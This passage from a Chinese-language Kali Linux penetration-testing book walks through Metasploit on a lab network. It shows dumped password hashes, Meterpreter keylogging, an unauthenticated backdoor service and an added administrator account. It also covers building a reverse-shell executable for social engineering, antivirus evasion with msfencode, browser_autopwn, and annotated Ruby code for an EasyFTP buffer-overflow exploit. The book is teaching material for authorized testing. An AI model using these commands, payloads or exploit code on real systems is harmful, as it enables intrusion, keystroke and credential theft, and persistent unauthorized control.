h4x:1010:ccf9155e3e7db453aad3b435b51404ee:3dbde697d71690a769204beb 12283678:::

salesdept:1011:8f51551614ded19365b226f9bfc33fab:7ad83174aadb77faac126fdd 377b1693:::

接下來，我們通過Meterpreter shell 運行keylog 程式，記錄鍵盤輸入的內容。鍵盤敲擊記錄可能含有目標主機的多項敏感資訊。

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM

meterpreter > ps

Process list

============

PID　　Name　　　　Arch　　Session　User　Path

---　　----　　　　----　　----　　----　----

0　　　[System Process]

4　　　System　　　x86　　0　　　NT AUTHORITY\SYSTEM

384　　smss.exe　　　x86　　0　　　NT AUTHORITY\SYSTEM

\SystemRoot\System32\smss.exe

488　　csrss.exe　　　x86　　0　　　NT AUTHORITY\SYSTEM

\??\C:\WINDOWS\system32\csrss.exe

648　　winlogon.exe　　x86　　0　　　NT AUTHORITY\SYSTEM

\??\C:\WINDOWS\system32\winlogon.exe

692　　services.exe　　x86　　0　　　NT AUTHORITY\SYSTEM

C:\WINDOWS\system32\services.exe

704　　lsass.exe　　　x86　　0　　　NT AUTHORITY\SYSTEM

C:\WINDOWS\system32\lsass.exe

...

148　　alg.exe　　x86　　0　　NT AUTHORITY\LOCAL SERVICE

C:\WINDOWS\System32\alg.exe

3172　　explorer.exe　x86　　0　　CUSTDESK\salesdept

C:\WINDOWS\Explorer.EXE

3236　　reader_sl.exe　x86　　0　　CUSTDESK\salesdept

C:\Program Files\Adobe\Reader 9.0\Reader\Reader_sl.exe

接下來，我們把 Meterpreter shell 插入 explorer.exe 的進程（3172），以便開始記錄當前使用者對系統的操作，所涉及的指令如下。

meterpreter > migrate 3172

[*] Migrating to 3172...

[*] Migration completed successfully.

meterpreter > getuid

Server username: CUSTDESK\salesdept

meterpreter > keyscan_start

Starting the keystroke sniffer...

現在就可以啟動鍵盤記錄程式。此後，我們等待程式錄取鍵盤記錄。

meterpreter > keyscan_dump

Dumping captured keystrokes...

<Return> www.yahoo.com <Return> <Back> www.bbc.co.uk <Return>

meterpreter > keyscan_stop

Stopping the keystroke sniffer...

上述資訊表明，鍵盤記錄程式記錄了被測主機的網上活動。類似地，我們可以把它注入到winlogon.exe（pid 648）進程裡，獲取所有帳戶的登錄資訊。

經過上述操作，我們已經獲取了被測主機的操作許可權。但是如果目標主機安裝了漏洞修復程式的補丁，我們就無法利用原有漏洞攻擊有關服務或應用程式。為了避免這一情況，我們可以通過常人所說的“後門”服務程式維護自己對目標主機的控制。務必要注意：一旦在被測主機上安裝了 Meterpreter提供的後門服務程式，所有人都可以控制被測主機；因為這個後面服務程式不對連入的控制端進行身份驗證。換句話說，這個程式可能會讓不請自來的人控制被測主機，這無疑是對被測單位形成了安全威脅。在正式的滲透測試業務中，這種有利於協力廠商攻擊的行為通常都被服務合同明文禁止。所以，我們不建議您在正式的測試環境中使用 Meterpreter 提供的後門服務程式。您也應當在擬定合同的範圍界定階段明確有關規則。

msf exploit(ms08_067_netapi) > exploit

[*] Started reverse handler on 192.168.0.3:4444

[*] Automatically detecting the target...

[*] Fingerprint: Windows XP Service Pack 2 - lang:English

[*] Selected Target: Windows XP SP2 English (NX)

[*] Attempting to trigger the vulnerability...

[*] Sending stage (749056 bytes) to 192.168.0.7

[*] Meterpreter session 1 opened (192.168.0.3:4444 ->

192.168.0.7:1032) at Tue Nov 16 19:21:39 +0000 2010

meterpreter > ps

...

292　alg.exe　　x86　0　　NT AUTHORITY\LOCAL SERVICE

C:\WINDOWS\System32\alg.exe

1840　csrss.exe　　x86　2　　NT AUTHORITY\SYSTEM

\??\C:\WINDOWS\system32\csrss.exe

528　winlogon.exe　x86　2　　NT AUTHORITY\SYSTEM

\??\C:\WINDOWS\system32\winlogon.exe

240　rdpclip.exe　x86　0　　CUSTDESK\Momin Desktop

C:\WINDOWS\system32\rdpclip.exe

1060　userinit.exe　x86　0　　CUSTDESK\Momin Desktop

C:\WINDOWS\system32\userinit.exe

1544　explorer.exe　x86　0　　CUSTDESK\Momin Desktop

C:\WINDOWS\Explorer.EXE

...

meterpreter > migrate 1544

[*] Migrating to 1544...

[*] Migration completed successfully.

meterpreter > run metsvc -h

...

meterpreter > run metsvc

[*] Creating a meterpreter service on port 31337

[*] Creating a temporary installation directory

C:\DOCUME～1\MOMIND～1\LOCALS～1\Temp\oNyLOPeS...

[*] >> Uploading metsrv.dll...

[*] >> Uploading metsvc-server.exe...

[*] >> Uploading metsvc.exe...

[*] Starting the service...

Installing service metsvc

Starting service

Service metsvc successfully installed.

通過上述指令，我們在被測主機上安裝了後門服務程式，現在可以關閉當前的meterpreter會話。在需要控制被測主機的時候，我們可以調用multi/handler中的windows/metsvc_bind_tcp payload，通過後門控制遠端主機。

meterpreter > exit

[*] Meterpreter session 1 closed. Reason: User exit

msf exploit(ms08_067_netapi) > back

msf > use exploit/multi/handler

msf exploit(handler) > set PAYLOAD windows/metsvc_bind_tcp

PAYLOAD => windows/metsvc_bind_tcp

msf exploit(handler) > set LPORT 31337

LPORT => 31337

msf exploit(handler) > set RHOST 192.168.0.7

RHOST => 192.168.0.7

msf exploit(handler) > exploit

[*] Starting the payload handler...

[*] Started bind handler

[*] Meterpreter session 2 opened (192.168.0.3:37251 ->

192.168.0.7:31337) at Tue Nov 16 20:02:05 +0000 2010

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM

此外，Meterpreter 的 getgui 腳本也很有用，它可開啟目標主機的遠端桌面功能。如需在目標主機上創建新的帳號，並強制啟用遠端桌面服務，可使用下述指令。

meterpreter > run getgui -u btuser -p btpass

[*] Windows Remote Desktop Configuration Meterpreter Script by

Darkoperator

[*] Carlos Perez [email protected]

[*] Language set by user to: 'en_EN'

[*] Setting user account for logon

[*]　Adding User: btuser with Password: btpass

[*]　Adding User: btuser to local group 'Remote Desktop Users'

[*]　Adding User: btuser to local group 'Administrators'

[*] You can now login with the created user

[*] For cleanup use command: run multi_console_command -rc

/root/.msf3/logs/scripts/getgui/clean_up__20101116.3447.rc

現在，我們可通過 rdesktop 程式登錄目標主機。我們新建一個終端視窗，並在其中輸入下述指令。

rdesktop 192.168.0.7:3389
請注意：如果已經破解了目標主機的帳戶名和密碼，就不需要新建任何帳號，直接執行 run getgui -e 命令啟用遠端桌面就可以了。另外，在完成滲透工作以後，記得要在Meterpreter shell 裡使用getgui/clean_up 腳本程式，以清理痕跡。

如果目標網路不可從外部直接訪問，那麼應該採取那些手段進一步滲透該網路呢？

Metasploit能夠通過跳板進行操作。您可通過routeaddtargetSubnettargetSubnetMask SessionId 的指令，將某個會話指定為跳板。此處 SessionId 指代已經建立的 Meterpreter 會話（即跳板閘道）， targetsubnet參數指代下一步需要測試的網段（如果被攻陷的主機是雙網設備，則可以是它的另一個網段）。Metasploit會通過跳板轉發指定的網路流量，這樣就可以繼續滲透、測試那些無法直接訪問到的網路設備。轉發流量的主機，就是通常所說的“跳板”或“立足點”。

場景4

上述案例演示了Metasploit框架利用被測主機的遠端漏洞的具體方法。那麼如何利用用戶端程式的漏洞（client-side exploitation）呢？就此問題，本文將以滲透測試人員的角度，通過典型案例介紹Metasploit在利用用戶端程式的漏洞方面的角色，幫助讀者瞭解它的靈活性和強大功能。

生成後門程式

Metasploit 的 msfpayload 工具能夠生成可單獨運行的、執行指定 Metasploit payload的後門程式。如果只能採取社會工程學手段對目標進行滲透，那麼這種手段就真是救命稻草了。在本例中，我們將生成一個帶有reverse shell payload的可執行檔，然後把它發給目標人物，誘使他/她執行這個檔。msfpayload程式可以生成多種語言的程式，輸出Perl、C、Raw、Ruby、JavaScript、Exe、DLL和VBA等格式的檔。

如需啟動msfpayload工具，可在您的shell中執行下述指令。

msfpayload -h
上述指令將會顯示它的使用說明，並列出所有可用的payload。它的指令格式和MSFCLI非常相似。現在，我們通過下述指令創建一個帶有reverse shell payload 的可執行程式。

msfpayload windows/shell_reverse_tcp LHOST=192.168.0.3 LPORT=33333 O
...

msfpayload windows/shell_reverse_tcp LHOST=192.168.0.3 LPORT=33333 X
/tmp/poker.exe

Created by msfpayload (http://www.metasploit.com).

Payload: windows/shell_reverse_tcp

Length: 314

Options: LHOST=192.168.0.3,LPORT=33333

這樣，我們就生成了自己的後門程式。在把它發送到受害人或目標之前，您必須在MSFConsle裡使用multi/handler做好服務端的準備，以便它可受理可執行檔連入本機的請求。這時候，要使multi/handler的配置和msfpayload在創建程式時的配置相匹配。

msf > use exploit/multi/handler

msf exploit(handler) > set PAYLOAD windows/shell_reverse_tcp

PAYLOAD => windows/shell_reverse_tcp

msf exploit(handler) > show options

...

msf exploit(handler) > set LHOST 192.168.0.3

LHOST => 192.168.0.3

msf exploit(handler) > set LPORT 33333

LPORT => 33333

msf exploit(handler) > exploit

[*] Started reverse handler on 192.168.0.3:33333

[*] Starting the payload handler...

現在，我們可以把準備好的Windows可執行檔通過社會工程欺騙方法發送給目的機器，然後等待對方運行。

[*] Command shell session 2 opened (192.168.0.3:33333 ->

192.168.0.7:1053) at Wed Nov 17 04:39:23 +0000 2010

Microsoft Windows XP [Version 5.1.2600]

(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\salesdept\Desktop>

如果在 MSFConsole 裡看見了上述資訊，就表明目標主機發起了 reverse shell，我們成功地連接到了被測主機的shell，圓滿地完成了任務。

Metasploit生成的檔能否規避殺毒軟體的檢測？

有很多種方法可以規避殺毒軟體的檢測，本文只介紹其中的一種。我們可使用/usr/bin/msfencode目錄下的msfencode工具，對可執行檔進行保護性封裝。在使用 msfpayload 程式生成可執行檔時，使用管道命令把檔內容傳給 msfencode 再生成最終檔。例如，下述指令將生成帶有reverse shell的可執行檔，並對檔進行保護性封裝：msfpayload windows/ shell/reverse_tcp LHOST=192.168.0.3 LPORT=32323 R | msfencode -e x86/shikata_ga_nai -t exe >/tmp/tictoe。在規避檢測方面，staged payload的成功率大於inlinepayload。

自動化流覽器漏洞利用

在測試較為安全的企業網路時，滲透人員往往不知從何處入手。在這種情況下，以使用電子設備的人員為目標，或以員工為首要目標開展社會工程學攻擊可能是唯一的方向。本例將使用 Metasploit 框架的用戶端漏洞利用範本，以演示基於技術手段的社會工程學攻擊。下面將介紹一款先進的輔助工具——Browser autopwn。在目標人員訪問它構建的惡意URL 的情況下，它能夠識別出被測主機的流覽器類型，並根據識別結果自動從框架中選用針對該流覽器的exploit程式對流覽器發起攻擊。有關的指令及運行結果如下。

msf > use auxiliary/server/browser_autopwn

msf auxiliary(browser_autopwn) > show options

...

msf auxiliary(browser_autopwn) > set LHOST 192.168.0.3

LHOST => 192.168.0.3

msf auxiliary(browser_autopwn) > set SRVPORT 80

SRVPORT => 80

msf auxiliary(browser_autopwn) > set SRVHOST 192.168.0.3

SRVHOST => 192.168.0.3

msf auxiliary(browser_autopwn) > set URIPATH /

URIPATH => /

msf auxiliary(browser_autopwn) > run

[*] Auxiliary module execution completed

[*] Starting exploit modules on host 192.168.0.3...

[*] --

[*] Starting exploit multi/browser/firefox_escape_retval with payload generic/ shell_reverse_tcp

[*] Using URL: http://192.168.0.3:80/Eem9cKUlFvW

[*] Server started.

[*] Starting exploit multi/browser/java_calendar_deserialize with payload java/meterpreter/reverse_tcp

[*] Using URL: http://192.168.0.3:80/s98jmOiOtmv4

[*] Server started.

[*] Starting exploit multi/browser/java_trusted_chain with payload java/ meterpreter/reverse_tcp

[*] Using URL: http://192.168.0.3:80/6BkY9uM23b

[*] Server started.

[*] Starting exploit multi/browser/mozilla_compareto with payload generic/shell_reverse_tcp

[*] Using URL: http://192.168.0.3:80/UZOI7Y

[*] Server started.

[*] Starting exploit multi/browser/mozilla_navigatorjava with payload generic/ shell_reverse_tcp

[*] Using URL: http://192.168.0.3:80/jRwlT67KIK6gJE

...

[*] Starting exploit windows/browser/ie_createobject with payload windows/meterpreter/reverse_tcp

[*] Using URL: http://192.168.0.3:80/Xb9Cop7VadNu

[*] Server started.

[*] Starting exploit windows/browser/ms03_020_ie_objecttype with payload windows/meterpreter/reverse_tcp

[*] Using URL: http://192.168.0.3:80/rkd0X4Xb

[*] Server started.

...

[*] Starting handler for windows/meterpreter/reverse_tcp on port 3333

[*] Starting handler for generic/shell_reverse_tcp on port 6666

[*] Started reverse handler on 192.168.0.3:3333

[*] Starting the payload handler...

[*] Starting handler for java/meterpreter/reverse_tcp on port 7777

[*] Started reverse handler on 192.168.0.3:6666

[*] Starting the payload handler...

[*] Started reverse handler on 192.168.0.3:7777

[*] Starting the payload handler...

[*] --- Done, found 15 exploit modules

[*] Using URL: http://192.168.0.3:80/

[*] Server started.

一旦目標人員訪問了惡意URL（http://192.168.0.3），程式將會識別出他的/她的流覽器，並執行相應的漏洞利用程式。在此以後，我們就可以通過用戶端利用程式滲透目標主機。

[*] Request '/' from 192.168.0.7:1046

[*] Request '/' from 192.168.0.7:1046

[*] Request '/?sessid=V2luZG93czpYUDpTUDI6ZW4tdXM6eDg2Ok1TSUU6Ni4wO1NQMjo %3d' from 192.168.0.7:1046

[*] JavaScript Report: Windows:XP:SP2:en-us:x86:MSIE:6.0;SP2:

[*] Responding with exploits

[*] Handling request from 192.168.0.7:1060...

[*] Payload will be a Java reverse shell to 192.168.0.3:7777 from 192.168.0.7...

[*] Generated jar to drop (4447 bytes).

[*] Handling request from 192.168.0.7:1061...

...

[*] Sending Internet Explorer COM CreateObject Code Execution exploit HTML to 192.168.0.7:1068...

[*] Request '/' from 192.168.0.7:1069

[*] Request '/' from 192.168.0.7:1068

[*] Request '/' from 192.168.0.7:1069

[*] Sending EXE payload to 192.168.0.7:1068...

[*] Sending stage (749056 bytes) to 192.168.0.7

[*] Meterpreter session 1 opened (192.168.0.3:3333 ->192.168.0.7:1072) at Thu Nov 18 02:24:00 +0000 2010

[*] Session ID 1 (192.168.0.3:3333 -> 192.168.0.7:1072) processing InitialAutoRunScript 'migrate -f'

[*] Current server process: hzWWoLvjDsKujSAsBVykMTiupUh.exe (4052)

[*] Spawning a notepad.exe host process...

[*] Migrating into process ID 2788

[*] New server process: notepad.exe (2788)

...

msf auxiliary(browser_autopwn) > sessions

Active sessions

===============

Id　Type　　Information

Connection

--　----　　----------

1 meterpreter x86/win32 CUSTDESK\Momin Desktop @ CUSTDESK

(ADMIN) 192.168.0.3:3333 -> 192.168.0.7:1072

msf auxiliary(browser_autopwn) > sessions -i 1

[*] Starting interaction with 1...

meterpreter > getuid

Server username: CUSTDESK\Momin Desktop

上述資訊表明，我們已經利用用戶端的攻擊程式成功滲透到目標主機。應當指出的是，這些Web流覽器的exploit程式，每個都只能對特定版本的特定流覽器（例如Intenet Explorer、Firefox、Opera等）進行攻擊。

9.3.4 編寫漏洞利用範本
Metasploit 框架最引人注目之處在於它可以獨立開發 exploit 程式。本節將圍繞 exploit開發的核心問題進行討論，通過生動的例子演示使用 Metasploit 框架的資料庫構造 exploit的關鍵步驟。然而，在使用這個框架編寫自己的 exploit 程式之前，您需要理解一些 Ruby程式設計的基礎知識。另外，您還需要掌握逆向工程的基本技能，並切實理解漏洞挖掘工具（如fuzzers和debuggers）的使用方法。只有兼備上述技能，您才能按步就班地構造exploit程式。本節的內容僅作為有關研發的簡略介紹，在完整程度上可能存在欠缺。

本例將針對 EasyFTP Server（1.7.0.11 以下版本）編寫利用 MKD Command Stack Buffer Overflow 漏洞的shellcode 程式，它能夠反映編寫緩衝區溢位exploit 的大致方法。您可以針對其他FTP服務端程式的相似漏洞，舉一反三地編寫exploit程式。這個exploit的原始程式碼的下載網址是/usr/share/metasploit-framework/modules/exploits/windows/ftp/easyftp_mkd_fixret.rb。

#
$Id: easyftp_mkd_fixret.rb 9935 2010-07-27 02:25:15Z jduck $
#
檔中的header部分描述了這個exploit的檔案名、修訂編號、創建日期和時間。

#
This file is part of the Metasploit Framework and may be subject to
redistribution and commercial restrictions. Please see the Metasploit
Framework web site for more information on licensing and terms of use.
http://metasploit.com/framework/
#
require 'msf/core'

在exploit的開頭部分，首先要對MSF核心庫進行初始化。

class Metasploit3 < Msf::Exploit::Remote

上述代碼所用的Exploit子類定義了遠端TCP連接所需的各種選項和方法（內置函數），包括RHOST、RPORT、Connect()、Disconnect()、SSL()等。

Rank = GreatRanking

上述代碼根據需求和使用的頻率分配等級。

include Msf::Exploit::Remote::Ftp

上述代碼中的Ftp子類用於和FTP服務端建立連接。

def initialize(info = {})

super(update_info(info,

'Name'　　　=> 'EasyFTP Server <= 1.7.0.11 MKD Command Stack Buffer Overflow',

'Description' => %q{

This module exploits a stack-based buffer overflow in EasyFTP Server 1.7.0.11

and earlier. EasyFTP fails to check input size when parsing 'MKD' commands, which

leads to a stack based buffer overflow.

NOTE: EasyFTP allows anonymous access by default. However, in order to access the

'MKD' command, you must have access to an account that can create directories.

After version 1.7.0.12, this package was renamed "UplusFtp".

This exploit utilizes a small piece of code that I've referred to as 'fixRet'.

This code allows us to inject of payload of ～500 bytes into a 264 byte buffer by

'fixing' the return address post-exploitation. See references for more information.

},

'Author' ==>

[

'x90c', # original version

'jduck', # port to metasploit / modified to use fix-up stub (works with bigger payloads)

],

'License'　=> MSF_LICENSE,

'Version'　=> '$Revision: 9935 $',

' References' =>

[

['OSVDB', '62134' ],

['URL', 'http://www.exploit-db.com/exploits/12044/'],

['URL', 'http://www.exploit-db.com/exploits/14399/']

],

上述代碼描述了exploit的常規資訊，並且明確了參考的資料。

'DefaultOptions' =>

{

'EXITFUNC' => 'thread'

上述代碼指定了exploit在結束時的銷毀方式。

},

'Privileged'　=> false,

'Payload'　　=>

{

'Space'　=> 512,

'BadChars' => "\x00\x0a\x0d\x2f\x5c",

'DisableNops' => true

},

上述代碼為shellcode預留了512位元組空間，列出應終止paylod的壞字元，並禁止使用NOP填充payload。

'Platform'　　=> 'win',

'Targets'　　=>

[

[ 'Windows Universal - v1.7.0.2', { 'Ret' =>

0x004041ec } ], # call ebp - from ftpbasicsvr.exe

[ 'Windows Universal - v1.7.0.3', { 'Ret' =>

0x004041ec } ], # call ebp - from ftpbasicsvr.exe

[ 'Windows Universal - v1.7.0.4', { 'Ret' =>

0x004041dc } ], # call ebp - from ftpbasicsvr.exe

[ 'Windows Universal - v1.7.0.5', { 'Ret' =>

0x004041a1 } ], # call ebp - from ftpbasicsvr.exe

[ 'Windows Universal - v1.7.0.6', { 'Ret' =>

0x004041a1 } ], # call ebp - from ftpbasicsvr.exe

[ 'Windows Universal - v1.7.0.7', { 'Ret' =>

0x004041a1 } ], # call ebp - from ftpbasicsvr.exe

[ 'Windows Universal - v1.7.0.8', { 'Ret' =>

0x00404481 } ], # call ebp - from ftpbasicsvr.exe

[ 'Windows Universal - v1.7.0.9', { 'Ret' =>

0x00404441 } ], # call ebp - from ftpbasicsvr.exe

[ 'Windows Universal - v1.7.0.10', { 'Ret' =>

0x00404411 } ], # call ebp - from ftpbasicsvr.exe

[ 'Windows Universal - v1.7.0.11', { 'Ret' =>

0x00404411 } ], # call ebp - from ftpbasicsvr.exe

],

'DisclosureDate' => 'Apr 04 2010',

'DefaultTarget' => 0))

上述代碼定義了作業系統的平臺類型，定義了Easy FTPServer（1.7.0.2～1.7.0.11）的10個（序號0～9）有缺陷的版本；根據版本的不同，又定義了可執行程式（ftpbasicsvr. exe）不同的返回位址。另外，它聲明了exploit的發佈日期，以及攻擊目標的預設版本號（1.7.0.2）。

end

def check

connect

disconnect

if (banner =～ /BigFoolCat/)

return Exploit::CheckCode::Vulnerable

end

return Exploit::CheckCode::Safe

end

上述代碼中的check()函數用於判斷目標主機是否存在該漏洞。

def make_nops(num); "C" * num; end

上述代碼定義的巨集函數可生成num個NOP，主要用於規避IDS/IPS/AV檢測。雖然這個程式確實使用NOP作為規避檢測的手段，但是通常情況下這種方式並不會奏效。所以，除非有特別好的理由，否則不要使用這種技術。簡單起見，在寫exploit範本的時候保留了這段代碼。

def exploit

connect_login

NOTE:
This exploit jumps to ebp, which happens to point at a partial version of
the 'buf' string in memory. The fixRet below fixes up the code stored on the
stack and then jumps there to execute the payload. The value in esp is used
with an offset for the fixup.
fixRet_asm = %q{

mov edi,esp

sub edi, 0xfffffe10

mov [edi], 0xfeedfed5

add edi, 0xffffff14

jmp edi

｝

fixRet = Metasm::Shellcode.assemble(Metasm::Ia32.new,

fixRet_asm).encode_string

buf = ''

上述代碼將返冋位址調整為 payload 的啟始地址。從技術上來說，它解決了堆疊定址（stack addressing）的問題。

print_status("Prepending fixRet...")

buf << fixRet

buf << make_nops(0x20 - buf.length)

exploit緩衝區的開頭部分是經編碼處理過的返回位址和隨機個NOP指令。

print_status("Adding the payload...")

buf << payload.encoded

上述代碼將在程式運行期間把shellcode動態地添加到exploit中。

Patch the original stack data into the fixer stub
buf[10, 4] = buf[268, 4]

print_status("Overwriting part of the payload with target

address...")

buf[268,4] = [target.ret].pack('V') # put return address

@ 268 bytes

調整棧裡的資料，修改返回位址為shellcode的位址。這樣利用棧的特性，程式在執行過程中將自動跳轉到shell的位址。

print_status("Sending exploit buffer...")

send_cmd( ['MKD', buf] , false)

最後，我們借助服務端程式裡存在漏洞的MKD指令（這是一個經過FTP身份驗證之後才能使用的指令），把構造好的緩衝區資料發送給指定主機。精心構造的buf資料可以通過Easy-FTP 服務端程式的 MKD 命令觸發基於棧結構的緩衝區溢位漏洞，繼而執行我們的payload，完成對目標系統的漏洞利用。之後，我們還要通過下述代碼關閉FTP連接。

handler

disconnect

end

end

Metasploit搭載了許多實用工具。Win32下的msfpescan程式和Linux下的msfelfscan，都可用於查找指定程式的返回位址。例如，要查找指定程式的返回位址，可使用指令：#./msfpescan -p targetapp.ext。

9.4 本章總結
本章介紹了利用目標漏洞的幾個關鍵點。開篇首先展示了漏洞檢測的全過程，並強調了有關工作所需的知識和技巧。功能強大的Kali Linux 是漏洞評估工作的利器。本章接下來列舉出了發佈各種已公佈漏洞和exploit程式的網站。本章的最後篇幅演示了髙級漏洞利用工具集——Metasploit框架。文中借助大量實例，介紹了通過各種利用漏洞獲取被測目標控制權的方法。此外，本文還深入淺出地介紹了編寫漏洞利用代碼的各個環節，闡述了exploit程式的基本框架和編寫策略。

下一章將會介紹提升許可權的各種工具和技術。

```
